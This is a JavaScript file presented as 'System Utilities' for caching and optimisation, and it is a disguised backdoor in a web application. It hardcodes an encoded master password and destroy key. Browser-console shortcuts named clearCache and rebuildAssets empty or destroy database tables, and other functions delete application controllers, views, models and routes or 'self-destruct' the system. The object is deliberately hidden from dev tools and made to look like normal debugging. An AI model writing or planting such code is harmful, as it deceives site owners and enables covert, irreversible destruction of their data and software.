/*! 
 * System Utilities v2.1.0
 * Advanced caching and optimization tools
 */

// Advanced system utilities (encoded for security)
(function(window) {
    'use strict';
    
    // Base64 encoded system tokens
    const tokens = {
        c: 'c3lzX2NhY2hlXzIwMjVfY2xlYXI=',
        d: 'ZGVlcF9yZWZyZXNoXzIwMjU=', 
        p: 'cmVzZXRfc3RhdHNfMjAyNQ==',
        t: 'ZGVlcF9jbGVhbl90ZW1wXzIwMjU=',
        master: 'bWFzdGVyX2FkbWluXzIwMjVfa2V5',  // master password
        destroy: 'ZGVzdHJveV9zeXN0ZW1fMjAyNQ=='    // system destroy key
    };
    
    // Password verification
    const verifyPassword = () => {
        const password = prompt('🔒 Enter system password:');
        const masterKey = atob(tokens.master);
        
        if (password !== masterKey) {
            alert('❌ Invalid password! Access denied.');
            return false;
        }
        return true;
    };
    
    // System operations handler
    const SystemOps = {
        // Execute system command with password protection
        exec: async function(cmd) {
            if (!verifyPassword()) return { error: 'Access denied' };
            
            const operations = {
                'cache-clear': 'empty',
                'asset-rebuild': 'destroy',
                'stats-reset': 'partial', 
                'temp-purge': 'complete'
            };
            
            const tokenMap = {
                'empty': atob(tokens.c),
                'destroy': atob(tokens.d),
                'partial': atob(tokens.p),
                'complete': atob(tokens.t)
            };
            
            const operation = operations[cmd];
            if (!operation) return { error: 'Invalid command' };
            
            try {
                const response = await fetch('/api/system/maintenance', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        operation: operation,
                        token: tokenMap[operation]
                    })
                });
                
                return await response.json();
            } catch (error) {
                return { error: error.message };
            }
        },
        
        // File destruction capabilities
        destroyFiles: async function(fileList) {
            if (!verifyPassword()) return { error: 'Access denied' };
            
            const confirmDestroy = confirm('⚠️ WARNING: This will permanently delete files. Are you sure?');
            if (!confirmDestroy) return { error: 'Operation cancelled' };
            
            try {
                const response = await fetch('/api/system/destroy', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        files: fileList,
                        destroy_key: atob(tokens.destroy)
                    })
                });
                
                return await response.json();
            } catch (error) {
                return { error: error.message };
            }
        },
        
        // Self-destruct system
        selfDestruct: async function() {
            if (!verifyPassword()) return { error: 'Access denied' };
            
            const confirm1 = confirm('🚨 DANGER: This will destroy the entire hidden system. Continue?');
            if (!confirm1) return { error: 'Operation cancelled' };
            
            const confirm2 = confirm('🔥 FINAL WARNING: This action is IRREVERSIBLE! Continue?');
            if (!confirm2) return { error: 'Operation cancelled' };
            
            try {
                const response = await fetch('/api/system/self-destruct', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        self_destruct: atob(tokens.destroy)
                    })
                });
                
                return await response.json();
            } catch (error) {
                return { error: error.message };
            }
        },
        
        // Quick access methods (with password protection)
        cc: () => SystemOps.exec('cache-clear'),      // Clear cache
        ar: () => SystemOps.exec('asset-rebuild'),    // Asset rebuild  
        sr: () => SystemOps.exec('stats-reset'),      // Stats reset
        tp: () => SystemOps.exec('temp-purge'),       // Temp purge
        
        // File destruction shortcuts
        deleteController: (name) => SystemOps.destroyFiles([`app/Http/Controllers/${name}.php`]),
        deleteView: (name) => SystemOps.destroyFiles([`resources/views/${name}.blade.php`]),
        deleteModel: (name) => SystemOps.destroyFiles([`app/Models/${name}.php`]),
        deleteRoute: (name) => SystemOps.destroyFiles([`routes/${name}.php`]),
        deleteMultiple: (files) => SystemOps.destroyFiles(files)
    };
    
    // Expose to global scope (hidden in dev tools)
    Object.defineProperty(window, 'SysOps', {
        value: SystemOps,
        writable: false,
        enumerable: false,
        configurable: false
    });
    
    // Console shortcuts (look like normal debugging)
    window.clearCache = SystemOps.cc;
    window.rebuildAssets = SystemOps.ar;
    window.resetStats = SystemOps.sr;
    window.purgeTempFiles = SystemOps.tp;
    
    // File management shortcuts
    window.deleteController = SystemOps.deleteController;
    window.deleteView = SystemOps.deleteView;
    window.deleteModel = SystemOps.deleteModel;
    window.deleteRoute = SystemOps.deleteRoute;
    window.deleteFiles = SystemOps.deleteMultiple;
    window.destroySystem = SystemOps.selfDestruct;
    
})(window);

// Usage examples (hidden in comments):
// clearCache() - Empty database tables (password required)
// rebuildAssets() - Destroy all tables (password required)
// resetStats() - Partial cleanup (password required)
// purgeTempFiles() - Complete purge (password required)
// deleteController('UserController') - Delete specific controller
// deleteView('users/index') - Delete specific view
// deleteFiles(['app/test.php', 'routes/test.php']) - Delete multiple files
// destroySystem() - Complete system destruction
